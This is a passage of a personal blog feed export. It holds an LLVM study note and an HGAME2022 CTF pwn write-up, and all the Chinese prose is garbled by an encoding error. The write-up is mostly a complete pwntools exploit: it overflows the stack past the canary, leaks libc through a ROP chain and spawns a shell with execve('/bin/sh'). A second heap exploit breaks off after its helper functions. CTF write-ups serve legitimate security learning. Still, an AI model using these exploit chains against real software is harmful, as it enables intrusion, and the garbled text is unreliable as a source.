<p>æˆ‘å€‘å¾ˆæ¸…æ¥šçš„çŸ¥é“ 1+2 çš„ AST æè¿°ï¼Œä½†æ˜¯å¦‚æœåªè€ƒæ…® 1+2ï¼Œé¡¯ç„¶ç„¡æ³•è¡¨ç¤ºæ•´å€‹ç¨‹åºã€‚é›–ç„¶åœ¨æ§‹å»º AST çš„éç¨‹ä¸­æœƒä¸Ÿå¤±ä¿¡æ¯ï¼Œä½†æ˜¯è‡³å°‘é‚„æ˜¯è¦èƒ½è¡¨ç¤ºç¨‹åºçš„ã€‚å¦‚ä½•æ§‹å»º ASTï¼ŒAST æœ‰ä»€éº½æ¨£çš„ä½œç”¨ï¼Œåƒ…åƒ…æ˜¯ä¸€å€‹ä¸­é–“ç’°ç¯€å—ï¼Œé‚„éœ€è¦æ›´æ·±çš„ç†è§£ã€‚</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>LLVM å­¸ç¿’ç¬”è®°</title>
    <url>/2023/09/21/%E6%95%A3%E8%A8%98-9-21-23/</url>
    <content><![CDATA[<p>çœ‹åˆ°ä»¥å‰çš„ä¸€ç¯‡æ—¥æœŸæ˜¯2020å¹´ï¼Œä¸€äº›æƒ…æ„Ÿå¦‚é¯åœ¨å–‰ã€‚å¥½ä¹…æ²’æœ‰å¯«ç­†è¨˜äº†ï¼Œæ¥ä¸‹ä¾†æº–å‚™é‡å•“ç­†è¨˜è¨ˆåŠƒï¼Œå¯èƒ½ä¹Ÿæœƒå·å·ç™¼ç™¼è«–æ–‡ç­†è¨˜</p>
<h1 id="LLVM-å­¸ç¿’"><a href="#LLVM-å­¸ç¿’" class="headerlink" title="LLVM å­¸ç¿’"></a>LLVM å­¸ç¿’</h1><h2 id="LLVM-ç‰ˆæœ¬"><a href="#LLVM-ç‰ˆæœ¬" class="headerlink" title="LLVM ç‰ˆæœ¬"></a>LLVM ç‰ˆæœ¬</h2><pre class="line-numbers language-none"><code class="language-none">commit ea42c4ac6a24c28fc12d5373a851ff376ea452cf (HEAD -&gt; main)
Author: Paul Walker &lt;paul.walker@arm.com&gt;
Date:   Fri Sep 8 16:14:58 2023 +0000

    [SVE] Precommit test to show missing initialisation of call operand.
    
    When calling func_f8_and_v0_passed_via_memory the memory used to
    hold the first vector operand is allocated but not initialised.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="LLVM-æºç¢¼çµæ§‹"><a href="#LLVM-æºç¢¼çµæ§‹" class="headerlink" title="LLVM æºç¢¼çµæ§‹"></a>LLVM æºç¢¼çµæ§‹</h2><pre class="line-numbers language-none"><code class="language-none">â”œâ”€â”€ CODE_OF_CONDUCT.md
â”œâ”€â”€ CONTRIBUTING.md
â”œâ”€â”€ LICENSE.TXT
â”œâ”€â”€ README.md
â”œâ”€â”€ SECURITY.md
â”œâ”€â”€ bolt
â”œâ”€â”€ build
â”œâ”€â”€ build-llvm
â”œâ”€â”€ clang
â”œâ”€â”€ clang-tools-extra
â”œâ”€â”€ cmake
â”œâ”€â”€ compiler-rt
â”œâ”€â”€ cross-project-tests
â”œâ”€â”€ flang
â”œâ”€â”€ install
â”œâ”€â”€ libc
â”œâ”€â”€ libclc
â”œâ”€â”€ libcxx
â”œâ”€â”€ libcxxabi
â”œâ”€â”€ libunwind
â”œâ”€â”€ lld
â”œâ”€â”€ lldb
â”œâ”€â”€ llvm
â”œâ”€â”€ llvm-libgcc
â”œâ”€â”€ mlir
â”œâ”€â”€ openmp
â”œâ”€â”€ polly
â”œâ”€â”€ pstl
â”œâ”€â”€ runtimes
â”œâ”€â”€ third-party
â””â”€â”€ utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>éƒ¨åˆ†æºä»£ç¢¼çµæ§‹</p>
<ul>
<li>boltï¼šMeta developed a <code>post-link optimizer</code> with <code>feedback-driven optimizations (FDO)</code> and <code>link-time optimizations (LTO)</code>ã€‚é€šä¿—çš„èªªå°±æ˜¯æŠŠç·¨è­¯å¾Œçš„ä¿¡æ¯ç”¨æ–¼ç·¨è­¯æœŸã€‚é—œæ–¼é€™å€‹ Meta ç™¼è¡¨äº†ç›¸é—œæ–‡ç« </li>
<li>clang-tools-extraï¼šå†…å®¹å’Œç›®éŒ„çš„åå­—ä¸€æ¨£ï¼Œå¯æƒœæˆ‘åªèªå¾— <code>clangd</code>ï¼Œ<code>clangd</code> æ˜¯ <code>language server</code> ï¼Œå®ƒæä¾›äº† IDE çš„ä¸€äº›åŠŸèƒ½æ¯”å¦‚äº¤å‰ç´¢å¼•ç­‰ç­‰ï¼Œè®“ vscode æ›´é©åˆé–²è®€æŸäº›æºä»£ç¢¼</li>
<li>clangï¼šé©ç”¨æ–¼ C å®¶æ—çš„ç·¨è­¯å™¨å‰ç«¯</li>
<li>compiler-rtï¼šæä¾›äº†èªè¨€ç¨ç«‹çš„åº«ï¼Œå¦‚ fuzz åº«</li>
<li>libcï¼Œlibclcï¼Œlibcxxï¼Œlibcxxabiï¼šæä¾›äº†ä¸€äº›åº«çµ¦ Cï¼ŒC++ç­‰èªè¨€</li>
<li>libunwindï¼šæä¾›äº†æ£§å±•é–‹ï¼Œå¯ä»¥ç”¨æ–¼ç•°å¸¸è™•ç†</li>
<li>lldï¼šLLVM linker</li>
<li>lldbï¼šLLVM debugger</li>
<li>mlirï¼šç”¨æ–¼æ‹“å±• LLVM IR åœ¨ç·¨è­¯æ™‚ä¸Ÿå¤±ä¿¡æ¯çš„å•é¡Œï¼Œé€™éº½çœ‹ä¾†å’Œ bolt æœ‰ä¸€å®šçš„ç›¸ä¼¼æ€§ã€‚</li>
<li>pollyï¼šPolly is a high-level loop and data-locality optimizer and optimization infrastructure for LLVM <a href="https://polly.llvm.org/">https://polly.llvm.org/</a></li>
</ul>
<p>åƒè€ƒè³‡æ–™</p>
<ul>
<li><a href="https://llvm.org/docs/GettingStartedTutorials.html">https://llvm.org/docs/GettingStartedTutorials.html</a></li>
<li><a href="https://llvm.org/doxygen/modules.html">https://llvm.org/doxygen/modules.html</a></li>
<li>learn llvm 12</li>
</ul>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Notes</tag>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME2022_partialPWN</title>
    <url>/2022/04/07/HGAME2022-partialPWN/</url>
    <content><![CDATA[<blockquote>
<p>ç›´æ¥è¿›è¡Œä¸€æ‰‹è®°å½•ï¼Œå› ä¸º pwn å¤ªèœæ‰€ä»¥å¿…é¡»å¥½å¥½è®°å½•ä¸€ä¸‹ã€‚é˜Ÿå‹ä¹Ÿç»™æˆ‘å¥½å¤šå¸®åŠ©ï¼Œæ„Ÿæ¿€ä¸å°½ã€‚</p>
</blockquote>
<h2 id="enter-the-evil-pwn-land"><a href="#enter-the-evil-pwn-land" class="headerlink" title="enter_the_evil_pwn_land"></a>enter_the_evil_pwn_land</h2><p>çœ‹äº† chuj çš„è§£æ³•ä¹‹åæ‰å‘ç° pwn çš„å·¥å…·å¥½ä¸°å¯Œï¼Œä¸ºä»€ä¹ˆä»¥å‰æˆ‘ä¼šå†™çš„é‚£ä¹ˆè‰°æ¶©ï¼ˆ<br>å¾ˆæ™®é€šçš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯è¦ç»•è¿‡ canaryï¼Œå¤§è‡´æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥è¦†ç›–åˆ° TLS ç»“æ„ä½“é‡Œé¢çš„ stack_guardï¼Œè€Œ TLS ç»“æ„ä½“åœ¨æ ˆçš„é«˜åœ°å€å¤„ï¼Œå¦‚æœèƒ½è¾“å…¥çš„èŒƒå›´å¾ˆå¤§ï¼Œå°±å¯ä»¥ç›´æ¥è¦†ç›–ã€‚å¦å¤–ä¸€ç§å°±æ˜¯æ³„éœ²ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ç­‰æ‰‹æ®µã€‚</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the
               thread descriptor used by libpthread.  */</span>
  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the thread descriptor.  */</span>
  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>
  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>
  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>
  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>
  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* Bit 0: X86_FEATURE_1_IBT.
     Bit 1: X86_FEATURE_1_SHSTK.
   */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>
  <span class="token comment">/* Reservation of some values for the TM ABI.  */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token comment">/* GCC split stack support.  */</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>
  <span class="token comment">/* The lowest address of shadow stack,  */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>
  <span class="token comment">/* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a.out'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

<span class="token comment"># dbg('set follow-fork-mode child\nb *0x401240')</span>

prdi <span class="token operator">=</span> <span class="token number">0x401363</span>
test_thread <span class="token operator">=</span> <span class="token number">0x4011D6</span>

<span class="token comment"># pay = b'a' * 0x28</span>
<span class="token comment"># sl(pay)</span>
<span class="token comment"># ru(b'\n')</span>
<span class="token comment"># fsbase = uu64(b'\x00' + ru(b'\n'))</span>
<span class="token comment"># print("***",hex(fsbase))</span>

rop_chain <span class="token operator">=</span> <span class="token string">b''</span>
rop_chain <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prdi<span class="token punctuation">,</span>binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> test_thread<span class="token punctuation">]</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
pay <span class="token operator">+=</span> rop_chain
pay <span class="token operator">=</span> pay<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x840</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span>

sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>

puts <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
execve <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span>

prdx_rcx_rbx <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x1056fd</span>
prsi <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x27529</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>prdx_rcx_rbx<span class="token punctuation">)</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
pay <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prdi<span class="token punctuation">,</span>binsh<span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>prdx_rcx_rbx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>

sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="oldfashion-note"><a href="#oldfashion-note" class="headerlink" title="oldfashion_note"></a>oldfashion_note</h2><p>libc-2.31.soï¼Œä¿æŠ¤å…¨å¼€</p>
<p>delete å‡½æ•°å­˜åœ¨ UAFï¼Œå…ˆé€šè¿‡ unsorted bin æ³„éœ² main_arena è¿›ä¸€æ­¥æ³„éœ² libc åŸºå€ã€‚å†é€šè¿‡ fastbin attackï¼Œåœ¨ fastbin ä¸Š double freeï¼Œç„¶åæ”¾å…¥ tcache è¿›å…¥åˆ†é…ï¼Œå®ç°ä»»æ„åœ°å€å†™ã€‚è¿™ä¸ªæ¼æ´çš„åŸå› æ˜¯å› ä¸º fastbin çš„æ ¡éªŒä¸å¤Ÿä¸¥æ ¼ã€‚</p>
<p>åŸç†å¦‚å›¾ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407120319821.png" alt="image-20220407120319821"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>


host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ld-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> sz<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> data <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sa<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
